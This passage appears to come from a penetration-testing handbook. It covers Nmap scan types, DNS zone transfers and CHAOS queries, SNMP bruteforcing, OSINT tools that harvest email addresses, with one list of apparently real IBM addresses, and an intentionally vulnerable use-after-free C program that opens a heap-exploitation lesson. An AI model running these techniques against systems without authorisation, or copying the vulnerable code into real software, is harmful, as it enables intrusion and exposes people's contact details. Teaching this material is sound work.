Nmap sends a SYN packet to the target, initiating a TCP connection. The target responds with SYN ACK, telling Nmap that the port is accessible. Finally, Nmap terminates the connection before it's finished by issueing a RST packet.</p>
<p><img src="Reconnaissance/Active/nmap/Resources/Images/tcp-syn-scan-wireshark.png" alt="" /></p>
<h1 id="tcp-connect-scan"><a class="header" href="#tcp-connect-scan">TCP Connect Scan</a></h1>
<ul>
<li>The default scan type when SYN scan isn't available - lacking root privileges (<code>-sT</code> option)</li>
<li>Nmap initiates a complete TCP connection with the target</li>
<li>The connection attempts are loggen onto the target</li>
<li>It's usually slower</li>
</ul>
<p><img src="Reconnaissance/Active/nmap/Resources/Images/tcp-connect-scan.png" alt="" /></p>
<p><img src="Reconnaissance/Active/nmap/Resources/Images/tcp-connect-scan-wireshark.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="enumerating-bind-servers-with-chaos"><a class="header" href="#enumerating-bind-servers-with-chaos">Enumerating BIND servers with CHAOS</a></h1>
<p>The BIND software is the most commonly used name server software, which supports CHAOSNET queries. This can be used to query the name server for its software type and version. We are no longer querying the domain name system but are instead requesting information about the BIND instance. Our queries will still take the form of domain names - using <code>.bind</code> as the top-level domain. The results from such a query are returned as <code>TXT</code> records. Use the following syntax for quering BIND with the CHAOS class:</p>
<pre><code class="language-bash">dig @&lt;name server&gt; &lt;class&gt; &lt;domain name&gt; &lt;record type&gt;
</code></pre>
<pre><code class="language-bash">┌──(cr0mll@kali)-[~]-[]
└─\\(  dig @192.168.129.138 chaos version.bind txt 

; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; @192.168.129.138 chaos version.bind txt
; (1 server found)
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 38138
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;version.bind.                  CH      TXT

;; ANSWER SECTION:
version.bind.           0       CH      TXT     &quot;9.8.1&quot;

;; AUTHORITY SECTION:
version.bind.           0       CH      NS      version.bind.

;; Query time: 0 msec
;; SERVER: 192.168.129.138#53(192.168.129.138)
;; WHEN: Tue Sep 14 16:24:35 EEST 2021
;; MSG SIZE  rcvd: 73
</code></pre>
<p>Looking at the answer section, we see that this name server is running BIND 9.8.1. Other chaos records you can request are <code>hostname.bind</code>, <code>authors.bind</code>, and <code>server-id.bind</code>.</p>
<h1 id="dns-zone-transfer"><a class="header" href="#dns-zone-transfer">DNS Zone Transfer</a></h1>
<p>A <em>Zone transfer</em> request provides the means for copying a DNS zone file from one name server to another. This, however, only works over TCP. By doing this, you can obtain all the records of a DNS server for a particular zone. This is done through the <code>AXFR</code> request type:</p>
<pre><code class="language-bash">dig @&lt;name server&gt; AXFR &lt;domain&gt;
</code></pre>
<pre><code class="language-bash">┌──(cr0mll0@kali)-[~]-[]
└─ \\) dig @192.168.129.138 AXFR nsa.gov 

; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; @192.168.129.138 AXFR nsa.gov
; (1 server found)
;; global options: +cmd
nsa.gov.                3600    IN      SOA     ns1.nsa.gov. root.nsa.gov. 2007010401 3600 600 86400 600
nsa.gov.                3600    IN      NS      ns1.nsa.gov.
nsa.gov.                3600    IN      NS      ns2.nsa.gov.
nsa.gov.                3600    IN      MX      10 mail1.nsa.gov.
nsa.gov.                3600    IN      MX      20 mail2.nsa.gov.
fedora.nsa.gov.         3600    IN      TXT     &quot;The black sparrow password&quot;
fedora.nsa.gov.         3600    IN      AAAA    fd7f:bad6:99f2::1337
fedora.nsa.gov.         3600    IN      A       10.1.0.80
firewall.nsa.gov.       3600    IN      A       10.1.0.105
fw.nsa.gov.             3600    IN      A       10.1.0.102
mail1.nsa.gov.          3600    IN      TXT     &quot;v=spf1 a mx ip4:10.1.0.25 ~all&quot;
mail1.nsa.gov.          3600    IN      A       10.1.0.25
mail2.nsa.gov.          3600    IN      TXT     &quot;v=spf1 a mx ip4:10.1.0.26 ~all&quot;
mail2.nsa.gov.          3600    IN      A       10.1.0.26
ns1.nsa.gov.            3600    IN      A       10.1.0.50
ns2.nsa.gov.            3600    IN      A       10.1.0.51
prism.nsa.gov.          3600    IN      A       172.16.40.1
prism6.nsa.gov.         3600    IN      AAAA    ::1
sigint.nsa.gov.         3600    IN      A       10.1.0.101
snowden.nsa.gov.        3600    IN      A       172.16.40.1
vpn.nsa.gov.            3600    IN      A       10.1.0.103
web.nsa.gov.            3600    IN      CNAME   fedora.nsa.gov.
webmail.nsa.gov.        3600    IN      A       10.1.0.104
www.nsa.gov.            3600    IN      CNAME   fedora.nsa.gov.
xkeyscore.nsa.gov.      3600    IN      TXT     &quot;knock twice to enter&quot;
xkeyscore.nsa.gov.      3600    IN      A       10.1.0.100
nsa.gov.                3600    IN      SOA     ns1.nsa.gov. root.nsa.gov. 2007010401 3600 600 86400 600
;; Query time: 4 msec
;; SERVER: 192.168.129.138#53(192.168.129.138)
;; WHEN: Fri Sep 17 22:38:47 EEST 2021
;; XFR size: 27 records (messages 1, bytes 709)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-2"><a class="header" href="#introduction-2">Introduction</a></h1>
<p>LDAP (Lightweight Directory Access Protocol) is a protocol which enables the locating of organizations, individuals, and other resources such as files and devices in a network.</p>
<p>An LDAP directory may be split across multiple servers. Each server can have a version of the total directory which is periodically synchronized. An LDAP server is called a Directory System Agent (DSA).</p>
<p>LDAP directories are organised in a tree hierarchy as follows:</p>
<ul>
<li>The root directory</li>
<li>Countries</li>
<li>Organisations</li>
<li>Organisational units (OUs) - divisions and departments</li>
<li>Individuals - these can be people, files, printers, etc.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-3"><a class="header" href="#introduction-3">Introduction</a></h1>
<p>You will need working knowledge of <a href="Reconnaissance/Active/../../Networking/Protocols/Simple%20Network%20Management%20Protocol%20(SNMP).html">SNMP</a> in order to follow through.</p>
<h1 id="snmp-enumeration-using-snmp-check"><a class="header" href="#snmp-enumeration-using-snmp-check">SNMP Enumeration using <code>snmp-check</code></a></h1>
<p><code>snmp-check</code> is a simple utility for basic SNMP enumeration. You only need to provide it with the IP address to enumerate:</p>
<pre><code>snmp-check [IP]
</code></pre>
<p>Furthermore, you have the following command-line options:</p>
<ul>
<li><code>-p</code>: Change the port to enumerate. Default is 161.</li>
<li><code>-c</code>: Change the community string to use. Default is <code>public</code></li>
<li><code>-v</code>: Change the SNMP version to use. Default is v1.</li>
</ul>
<p>There are additional arguments that can be provided but these are the salient ones.</p>
<p><img src="Reconnaissance/Active/Resources/Images/SNMP_snmp_check.png" alt="" /></p>
<h1 id="snmp-enumeration-using-snmpwalk"><a class="header" href="#snmp-enumeration-using-snmpwalk">SNMP Enumeration using <code>snmpwalk</code></a></h1>
<p><code>snmpwalk</code> is a much more versatile tool for SNMP enumeration. It's syntax is mostly the same as <code>snmp-check</code>:</p>
<p><img src="Reconnaissance/Active/Resources/Images/SNMP_snmpwalk.png" alt="" /></p>
<h1 id="bruteforce-community-strings-with-onesixtyone"><a class="header" href="#bruteforce-community-strings-with-onesixtyone">Bruteforce community strings with <code>onesixtyone</code></a></h1>
<p>Notwithstanding its age, <code>onesixtyone</code> is a good tool which allows you to bruteforce community strings by specifying a file instead of a single string with its <code>-c</code> option. It's syntax is rather simple:</p>
<p><img src="Reconnaissance/Active/Resources/Images/SNMP_onesixtyone_syntax.png" alt="" /></p>
<p><img src="Reconnaissance/Active/Resources/Images/SNMP_onesixtyone_bruteforce.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="what-are-you-looking-for"><a class="header" href="#what-are-you-looking-for">What are you looking for?</a></h1>
<p>The goal of OSINT (OpenSource Intelligence Gathering) is to obtain information about the victim. This is <em>passive</em> reconnaissance as it doesn't interact with the target systems at all and is therefore not detectable. You should be generally looking for the following:</p>
<ul>
<li>usernames, profile names and email addresses</li>
<li>passwords, PINs, private keys</li>
<li>domain names</li>
<li>hostnames</li>
<li>software and OS types, versions, and names</li>
<li>IP addresses</li>
<li>technical documentation</li>
</ul>
<h1 id="where-can-you-find-this-information"><a class="header" href="#where-can-you-find-this-information">Where can you find this information?</a></h1>
<ul>
<li>social media (Facebook, Instagram, LinkedIn, Twitter, YouTube, etc.)</li>
<li>personal websites</li>
<li>accounts in forums and common platforms such as Github</li>
<li>public databases (wireless registrars, ICANN, domain name registrars, libraries, and even phone directories)</li>
<li>peer-to-peer sharing networks</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="what-is-recon-ng"><a class="header" href="#what-is-recon-ng">What is recon-ng?</a></h1>
<p>Recon-ng is a powerful open-source framework for conducting OSINT. It is available at https://github.com/lanmaster53/recon-ng</p>
<h1 id="setup"><a class="header" href="#setup">Setup</a></h1>
<p>recon-ng comes pre-installed with Kali, but can be downloaded on Debian-based distros through the <code>apt</code> package manager.</p>
<pre><code class="language-bash">sudo apt install recon-ng
</code></pre>
<p>For many of the modules you will need to add API keys. More on that you can read <a href="https://github.com/lanmaster53/recon-ng-marketplace/wiki/API-Keys">here</a>.</p>
<p>You will need to install any modules before using them. You can install all modules with the following command inside recon-ng:</p>
<pre><code class="language-bash">marketplace install all
</code></pre>
<pre><code class="language-bash">[recon-ng][default] &gt; marketplace install all
[*] Module installed: discovery/info_disclosure/cache_snoop
[*] Module installed: discovery/info_disclosure/interesting_files
[*] Module installed: exploitation/injection/command_injector
[*] Module installed: exploitation/injection/xpath_bruter
[*] Module installed: import/csv_file
[*] Module installed: import/list
[*] Module installed: import/masscan
[*] Module installed: import/nmap
--snip--
[*] Reloading modules...
</code></pre>
<p>You will also see errors for any API keys you haven't set up yet:</p>
<pre><code class="language-bash">[!] 'github_api' key not set. github_commits module will likely fail at runtime. See 'keys add'.
[!] Module 'recon/netblocks-companies/censys_netblock_company' disabled. Dependency required: ''censys''.
[!] 'whoxy_api' key not set. whoxy_whois module will likely fail at runtime. See 'keys add'.
[!] Module 'recon/domains-companies/censys_companies' disabled. Dependency required: ''censys''.
[!] 'bing_api' key not set. bing_linkedin_contacts module will likely fail at runtime. See 'keys add'.
[!] 'github_api' key not set. github_users module will likely fail at runtime. See 'keys add'.
[!] Module 'recon/hosts-hosts/censys_hostname' disabled. Dependency required: ''censys''.
[!] Module 'recon/hosts-hosts/censys_ip' disabled. Dependency required: ''censys''.
[!] 'ipinfodb_api' key not set. ipinfodb module will likely fail at runtime. See 'keys add'.
--snip--
</code></pre>
<h1 id="workflow"><a class="header" href="#workflow">Workflow</a></h1>
<ol>
<li>
<p>Workspaces - recon-ng organises gathered information into workspaces, which are managed with the <code>workspaces</code> command. Workspaces are stored in <code>~/.recon-ng/workspaces</code></p>
<ul>
<li>
<p>create a workspace:</p>
<pre><code class="language-bash">workspaces create &lt;name&gt;
</code></pre>
<pre><code class="language-bash">[recon-ng][default] &gt; workspaces create MHN
[recon-ng][MHN] &gt;
</code></pre>
</li>
<li>
<p>list all workspaces:</p>
<pre><code class="language-bash">worspaces list
</code></pre>
<p><img src="Reconnaissance/OSINT/Tools/../Resources/Images/recon-ng-workspaces-list.png" alt="" /></p>
</li>
</ul>
</li>
<li>
<p>Modules - recon-ng organises its functionality into the so-called modules which need to be installed before they may be used.</p>
<ul>
<li>
<p>load a module:</p>
<pre><code class="language-bash">modules load &lt;name&gt;
</code></pre>
<p><img src="Reconnaissance/OSINT/Tools/../Resources/Images/recon-ng-modules-load.png" alt="" /></p>
</li>
<li>
<p>run a module:</p>
<pre><code class="language-bash">run
</code></pre>
<pre><code class="language-bash">[recon-ng][MHN][profiler] &gt; run
[!] Source contains no input.
</code></pre>
</li>
</ul>
</li>
</ol>
<h1 id="modules"><a class="header" href="#modules">Modules</a></h1>
<h3 id="profiler"><a class="header" href="#profiler">profiler</a></h3>
<p>This module is a <em>profile collector</em> - it searches the Web for user profiles belonging to target individuals and stores any information it finds in the recon-ng database. It uses a table called <code>profiles</code> as its source.</p>
<ul>
<li>insert a username into the table:
<pre><code class="language-bash">db insert profiles &lt;username&gt;~~~~
</code></pre>
<pre><code class="language-bash">[recon-ng][MHN][profiler] &gt; db insert profiles testuser~~~~
[*] 1 rows affected.
[recon-ng][MHN][profiler] &gt; show profiles

+---------------------------------------------------------------------+
| rowid | username | resource | url | category | notes |    module    |
+---------------------------------------------------------------------+
| 1     | testuser |          |     |          |       | user_defined |
+---------------------------------------------------------------------+

[*] 1 rows returned
</code></pre>
<ul>
<li>you can also insert an e-mail address or just the first part of one (without the @ and domain)</li>
<li>inserting multiple usernames and/or e-mail addresses is also possible</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="what-is-theharvester"><a class="header" href="#what-is-theharvester">What is theHarvester?</a></h1>
<p>theHarvester is a powerful tool for gathering emails, names, subdomains, IPs, and URLs using a multitude of publicly available data sources. The tool is primarily a passive reconnaissance tool, however, it does employ some active reconnaissance, too. The active aspects are the DNS brute force and the screenshots it can take of any subdomains that were found. The GitHub page for theHarvester is located at https://github.com/laramies/theHarvester.</p>
<h1 id="email-and-subdomain-harvesting"><a class="header" href="#email-and-subdomain-harvesting">Email and subdomain harvesting</a></h1>
<p>All you need to get started is a domain name. You specify it with the <code>-d</code> argument. You need to provide a data source using the <code>-b</code> option. These are the sources you can choose from:</p>
<p><code>baidu, bing, bingapi, dogpile, google, googleCSE, googleplus, google-profiles, linkedin, pgp, twitter, vhost, virustotal, threatcrowd, crtsh, netcraft, yahoo, all</code></p>
<p>This is a simple theHarvester query:</p>
<pre><code class="language-bash">theHarvester -d kali.org -b google
</code></pre>
<p><img src="Reconnaissance/OSINT/Tools/../Resources/Images/theHarvester-simple-results.png" alt="" /></p>
<p>Additional options:</p>
<ul>
<li><code>-l</code> - limit the number of results to work with</li>
<li><code>-s</code> - start in the specified result number</li>
<li><code>-h</code> - use SHODAN database to query discovered hosts</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="using-whois-for-gathering-domain-name-and-ip-address-information"><a class="header" href="#using-whois-for-gathering-domain-name-and-ip-address-information">Using whois for gathering domain name and IP address information</a></h1>
<p><code>whois</code> is a tool for finding domain name and IP address information which can be used as part of your OSINT gathering because it uses public data sources. You can use it as follows:</p>
<pre><code class="language-bash">whois &lt;hostname&gt;
</code></pre>
<pre><code class="language-bash">┌──(backslash0@kali)-[~]-[]
└─\\(  whois tesla.com                                                                                                                                                                                                                      1 ⨯
   Domain Name: TESLA.COM
   Registry Domain ID: 187902_DOMAIN_COM-VRSN
   Registrar WHOIS Server: whois.markmonitor.com
   Registrar URL: http://www.markmonitor.com
   Updated Date: 2020-10-02T09:07:57Z
   Creation Date: 1992-11-04T05:00:00Z
   Registry Expiry Date: 2022-11-03T05:00:00Z
   Registrar: MarkMonitor Inc.
   Registrar IANA ID: 292
   Registrar Abuse Contact Email: abusecomplaints@markmonitor.com
   Registrar Abuse Contact Phone: +1.2083895740
   Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited
   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
   Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited
   Domain Status: serverDeleteProhibited https://icann.org/epp#serverDeleteProhibited
   Domain Status: serverTransferProhibited https://icann.org/epp#serverTransferProhibited
   Domain Status: serverUpdateProhibited https://icann.org/epp#serverUpdateProhibited
   Name Server: A1-12.AKAM.NET
   Name Server: A10-67.AKAM.NET
   Name Server: A12-64.AKAM.NET
   Name Server: A28-65.AKAM.NET
   Name Server: A7-66.AKAM.NET
   Name Server: A9-67.AKAM.NET
   Name Server: EDNS69.ULTRADNS.BIZ
   Name Server: EDNS69.ULTRADNS.COM
   Name Server: EDNS69.ULTRADNS.NET
   Name Server: EDNS69.ULTRADNS.ORG
   DNSSEC: unsigned
   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
&gt;&gt;&gt; Last update of whois database: 2021-09-14T09:01:10Z &lt;&lt;&lt;
</code></pre>
<h1 id="using-host-for-quick-lookups"><a class="header" href="#using-host-for-quick-lookups">Using host for quick lookups</a></h1>
<p><code>host</code> is DNS querying tool which can be used for quick lookups. It will often return more than a single IP address:</p>
<pre><code class="language-bash">host &lt;hostname or IP&gt;
</code></pre>
<pre><code class="language-bash">┌──(backslash0@kali)-[~]-[]
└─ \\) host google.com                
google.com has address 172.217.169.174
google.com has IPv6 address 2a00:1450:4017:80a::200e
google.com mail is handled by 10 aspmx.l.google.com.
google.com mail is handled by 20 alt1.aspmx.l.google.com.
google.com mail is handled by 40 alt3.aspmx.l.google.com.
google.com mail is handled by 30 alt2.aspmx.l.google.com.
google.com mail is handled by 50 alt4.aspmx.l.google.com.
</code></pre>
<p>You can also do reverse name lookups by supplying an IP address:</p>
<pre><code class="language-bash">┌──(backslash0@kali)-[~]-[]
└─\\(  host 8.8.8.8        
8.8.8.8.in-addr.arpa domain name pointer dns.google.
</code></pre>
<p>A special domain <code>in-addr.arpa</code> is used for reverse DNS lookups. You can read more about it <a href="Reconnaissance/OSINT/../../Networking/Protocols/Domain%20Name%20System%20(DNS)/The%20in-addr.arpa%20Domain.html">here</a>.</p>
<h1 id="querying-name-servers-with-dig"><a class="header" href="#querying-name-servers-with-dig">Querying name servers with dig</a></h1>
<p><code>dig</code> is a tool for performing DNS queries. It can be used to request specific resource records such as the SOA.</p>
<pre><code class="language-bash">dig &lt;domain&gt; SOA
</code></pre>
<pre><code class="language-bash">┌──(backslash0@kali)-[~]-[]
└─ \\) dig google.com SOA

; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; google.com SOA
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 41904
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 512
;; QUESTION SECTION:
;google.com.                    IN      SOA

;; ANSWER SECTION:
google.com.             5       IN      SOA     ns1.google.com. dns-admin.google.com. 396314134 900 900 1800 60

;; Query time: 8 msec
;; SERVER: 192.168.129.2#53(192.168.129.2)
;; WHEN: Tue Sep 14 15:43:28 EEST 2021
;; MSG SIZE  rcvd: 89
</code></pre>
<p>We can see that the SOA is listed as <code>ns1.google.com</code> in the <code>ANSWER SECTION</code>. You can find the IP of this name server with dig, too.</p>
<pre><code class="language-bash">┌──(backslash0@kali)-[~]-[]
└─\\(  dig ns1.google.com

; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; ns1.google.com
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 41311
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 512
;; QUESTION SECTION:
;ns1.google.com.                        IN      A

;; ANSWER SECTION:
ns1.google.com.         5       IN      A       216.239.32.10

;; Query time: 43 msec
;; SERVER: 192.168.129.2#53(192.168.129.2)
;; WHEN: Tue Sep 14 15:47:51 EEST 2021
;; MSG SIZE  rcvd: 59
</code></pre>
<p>Note that usually the SOA for domains of smaller organizations, isn't actually a part of that domain, but is instead a server provided by a hosting company.</p>
<p>Notice how in the answer section for <code>google.com</code> there was a <code>dns-admin.google.com</code> domain? That's actually not a domain, it's an email address and should be read as <code>dns-admin@google.com</code>. Yep, DNS stores emails in zone files, too. But how do you figure out which one is a hostname and which is an email address? The email address comes last.</p>
<p><code>dig</code> can also be used to query specific name servers with the following syntax:</p>
<pre><code class="language-bash">dig @&lt;name server&gt; &lt;domain&gt;
</code></pre>
<pre><code class="language-bash">┌──(backslash0@kali)-[~]-[]
└─ \\) dig @192.168.129.138 nsa.gov     

; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; @192.168.129.138 nsa.gov
; (1 server found)
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 48156
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;nsa.gov.                       IN      A

;; AUTHORITY SECTION:
nsa.gov.                600     IN      SOA     ns1.nsa.gov. root.nsa.gov. 2007010401 3600 600 86400 600

;; Query time: 0 msec
;; SERVER: 192.168.129.138#53(192.168.129.138)
;; WHEN: Tue Sep 14 15:57:47 EEST 2021
;; MSG SIZE  rcvd: 81
</code></pre>
<p>Here we notice that there is no <code>ANSWER SECTION</code>, but there is an <code>AUTHORITY SECTION</code>. The queried server didn't reply with a direct answer to our request but instead pointed us to the name server responsible for answering queries about <code>nsa.gov</code>, which turns out to be <code>ns1.nsa.gov</code>. </p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-4"><a class="header" href="#introduction-4">Introduction</a></h1>
<p>Goolge can be a very powerful tool in your OSINT toolkit. <em>Google dorking</em> or <em>Google hacking</em> is the art of using specially crafted Google queries to expose sensitive information on the Internet. Such a query is called a <em>Google dork</em>.</p>
<p>You may find all sorts of data and information, including exposed <em>passwd</em> files, lists with usernames, software versions, and so on.</p>
<p><em>Note: If you find such an exposed web server, do NOT click on the links from the search results. Such an act may be considered illegal! Only do this if you have written permission from the target system's owner.</em></p>
<p>A good resource for finding Google dorks is the Google Hacking Database located at https://www.exploit-db.com/google-hacking-database.</p>
<p><em>You shouldn't enter any spaces between the advanced search operator and the query</em>.</p>
<h1 id="common-operators"><a class="header" href="#common-operators">Common operators</a></h1>
<p><strong>site:</strong> - restricts the search results to those only on the specified domain or site</p>
<p><strong>inurl:</strong> - restricts results to pages containing the specified word in the URL</p>
<p><strong>allinurl:</strong> - restricts results to pages containing all the specified words in the URL</p>
<p><strong>intitle:</strong> - restricts results to pages containing the specified word in the title</p>
<p><strong>allintitle:</strong> - restricts results to pages containing all the specified words in the title</p>
<p><strong>inanchor:</strong> - restricts results to pages containing the specified word in the anchor text of links located on that page</p>
<ul>
<li>an anchor text is the text displayed for links instead of the URL</li>
</ul>
<p><strong>allinanchor:</strong> - restricts results to pages containing all the specified terms in the anchor text of links located on that page</p>
<p><strong>cache:</strong> - displays Google's cached version of the webpage instead of the current version</p>
<p><strong>link:</strong> - searches for pages that contain links pointing to the specified site or page</p>
<ul>
<li>you can't combine a link operator with a regular keyword query</li>
<li>combining link: with other advanced search operators may not yield all the matching results</li>
</ul>
<p><strong>related:</strong> - displays websites similar or related to the one specified</p>
<p><strong>info:</strong> - finds information about a specific page</p>
<p><strong>location:</strong> - finds location information about a specific query</p>
<p><strong>filetype:</strong> - restricts results to the specified filetype</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="grabbing-e-mails-from-google-using-goog-mailpy"><a class="header" href="#grabbing-e-mails-from-google-using-goog-mailpy">Grabbing E-Mails from Google using goog-mail.py</a></h1>
<p><code>goog-mail.py</code> is a useful script used for getting email addresses from Google search results. Its author is unknown, but the script is available in many different places online.</p>
<ol>
<li>You will need to download the script from https://github.com/leebaird/discover/blob/master/mods/goog-mail.py (or any other place you found it)</li>
</ol>
<pre><code class="language-bash">wget https://raw.githubusercontent.com/leebaird/discover/master/mods/goog-mail.py
</code></pre>
<pre><code class="language-bash">┌──(backslash0㉿kali)-[~/MHN/Reconnaissance/OSINT]
└─\\(  wget https://raw.githubusercontent.com/leebaird/discover/master/mods/goog-mail.py                                                                                                                                                    1 ⨯
--2021-09-06 10:05:18--  https://raw.githubusercontent.com/leebaird/discover/master/mods/goog-mail.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2103 (2.1K) [text/plain]
Saving to: ‘goog-mail.py’

goog-mail.py.1                                              100%[========================================================================================================================================&gt;]   2.05K  --.-KB/s    in 0s      

2021-09-06 10:05:18 (41.9 MB/s) - ‘goog-mail.py’ saved [2103/2103]
</code></pre>
<ol start="2">
<li>Run the script providing a <code>domain_name</code></li>
</ol>
<pre><code class="language-bash">python2 goog-mail.py [domain_name]
</code></pre>
<pre><code class="language-bash">┌──(backslash0㉿kali)-[~/MHN/Reconnaissance/OSINT]
└─ \\) python2 goog-mail.py uk.ibm.com
ukclubom@uk.ibm.com
martyn.spink@uk.ibm.com
gfhelp@uk.ibm.com
iand_ferguson@uk.ibm.com
graham.butler@uk.ibm.com
laurence.carpanini@uk.ibm.com
Pensions@uk.ibm.com
Bennett@uk.ibm.com
ibm_crc@uk.ibm.com
brian.mcglone@uk.ibm.com
wakefim@uk.ibm.com
</code></pre>
<ol start="3">
<li>Make sure the emails look valid</li>
</ol>
<h1 id="other-tools"><a class="header" href="#other-tools">Other tools</a></h1>
<p>Another very good tool for this purpose is <a href="Reconnaissance/OSINT/Tools/theHarvester.html">theHarvester</a>.</p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="exploitation"><a class="header" href="#exploitation">Exploitation</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="binary-exploitation"><a class="header" href="#binary-exploitation">Binary Exploitation</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="heap-exploitation"><a class="header" href="#heap-exploitation">Heap Exploitation</a></h1>
<p>Exploitation techniques for the heap are different from those which work on the stack. In general, heap exploitation is more difficult and warrants creativity in order for an attack to be successful.</p>
<p>Heap exploitation usually relies on the already implemented logic of a binary and abuses it by providing the program with malicious data. A very common attack goal is to force the program to allocate two structs at the same memory, thereby corrupting them and possibly overwriting any function pointers or causing further overflows on the stack.</p>
<p>Another common technique is to force the heap manager to allocate and write to memory that is actually outside the heap, possibly overwriting the GOT or even just replacing blank return addresses.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-5"><a class="header" href="#introduction-5">Introduction</a></h1>
<p>A use-after-free vulnerability occurs when we are allowed to write to an already freed chunk as if it were still a valid allocation. The next time <code>malloc</code> is invoked with that particular chunk size, a pointer to the same memory where the previously freed chunk was will be returned. This means that the now in-use chunk actually has the malicious data we put into that memory.</p>
<p>Such vulnerabilities occur when a pointer to heap memory is freed, but that pointer is still used afterwards.</p>
<p>Writing to the free chunk also allows for messing with the linked lists pointers. Overwriting the <code>fwd</code> pointer with a value that points outside the heap can result in the modification of arbitrary memory.</p>
<h1 id="example"><a class="header" href="#example">Example</a></h1>
<p>use_after_free_logic.c:</p>
<pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

struct User
{
	char Username[32];
	int IsLoggedIn;
};

struct Service
{
	char Name[32];
	int IsEnabled;
};

int main(void)
{
	char input[128];
	struct User* user = NULL;
	struct Service* srv = NULL;
	
	while(1)
	{
		printf(&quot;\nType 'register [username]' in order to create a new user.\n&quot;);
		printf(&quot;Type 'login' to login as a user. \n&quot;);
		printf(&quot;Type 'service [name]' to create a new service. \n&quot;);
		printf(&quot;Type 'logout' to log out of the current user. \n&quot;);
		
		if(fgets(input, sizeof(input), stdin) == NULL) break;
		
		if(strncmp(input, &quot;register &quot;, 9) == 0) 
		{
     			user = malloc(sizeof(struct User));
      			if(strlen(input + 9) &lt; 31) 
      			{
        			strcpy(user-&gt;Username, input + 9);
        			user-&gt;IsLoggedIn = 0;
      			}
    		}
    		
    		if(strncmp(input, &quot;login&quot;, 5) == 0)
    		{
    			printf(&quot;Login successful. \n&quot;);
    			user-&gt;IsLoggedIn = 1;
    		}
    		
    		if(strncmp(input, &quot;logout&quot;, 6) == 0)
    		{
    			free(user);
    		}
    		
    		if(strncmp(input, &quot;service &quot;, 8) == 0)
    		{
    			srv = malloc(sizeof(struct Service));
      			if(strlen(input + 8) &lt; 31) 
      			{
        			strcpy(srv-&gt;Name, input + 8);
      			}
      			
      			printf(&quot;Executing service...\n&quot;);
    			if(srv == NULL)
    			{
    				printf(&quot;Error: Service does not exists.\n&quot;);
    			}
    			else if(srv-&gt;IsEnabled)
    			{
    				printf(&quot;Service successfully executed.\n&quot;);
    				break;
    			}
    			else
    			{
    				printf(&quot;Error: Service is not enabled.\n&quot;);
    			}		
    		}
	}
	return 0;
}
</code></pre>
<p>Our goal is to successfully get to the <code>&quot;Service successfully executed.&quot;</code> message.</p>
<p>Looking at the above code, we see that there are two structs - <code>User</code> and <code>Service</code> - with essentially the same memory layout. This programme appears to be some sort of a simple user/service manager. At first glance, we can register a new user with a given username, log into that user, log out of that user and create and attempt to run a service. </p>
<p>Let's see what happens, if we run the program as intended:</p>
<p><img src="Exploitation/Binary%20Exploitation/Heap%20Exploitation/Resources/Source%20Files/UAF_regular.png" alt="" /></p>
<p>We witness an error telling us that the service has not been enabled. Hmm, let's take a closer look at the <code>Service</code> struct. It is comprised of a 32 character name and a flag telling us whether or not the service has been enabled. Furthermore, we notice that the <code>User</code> struct has essentially the same memory layout. Now, this could serve as an attack surface if we manage to force the program to allocate two of those structs - the <code>User</code> and the <code>Service</code> - in the same memory space.</p>
